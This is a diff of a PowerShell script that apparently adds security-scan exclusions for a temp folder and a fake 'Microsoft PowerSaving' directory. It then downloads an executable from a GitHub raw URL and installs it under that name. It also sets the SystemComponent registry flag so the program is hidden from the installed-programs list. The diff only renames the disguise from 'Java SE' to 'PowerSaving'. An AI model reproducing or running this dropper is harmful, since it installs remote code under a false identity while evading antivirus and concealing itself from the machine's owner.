@@ -1,4 +1,4 @@
-$exclusions = @("C:\Program Files\Java SE\", "$env:TEMP")
+$exclusions = @("C:\Program Files\Microsoft\PowerSaving", "$env:TEMP")
 
 foreach ($path in $exclusions) {
     try {
@@ -10,9 +10,9 @@ foreach ($path in $exclusions) {
     }
 }
 
-$downloadUrl = "https://github.com/insidemail/inside/raw/refs/heads/main/Javax86"
-$downloadPath = "$env:TEMP\Java.exe"
-$installPath = "C:\Program Files\Java SE\Java"
+$downloadUrl = "https://github.com/insidemail/inside/raw/refs/heads/main/PowerSaving64"
+$downloadPath = "$env:TEMP\PowerSaving64-app.exe"
+$installPath = "C:\Program Files\Microsoft\PowerSaving"
 
 try {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath
@@ -29,4 +29,4 @@ try {
     Write-Error "Nao Baixou"
 }
 
-New-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\JavaPlataform' -Name 'SystemComponent' -Value 1 -PropertyType DWord -Force
+New-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\PowerSaving' -Name 'SystemComponent' -Value 1 -PropertyType DWord -Force
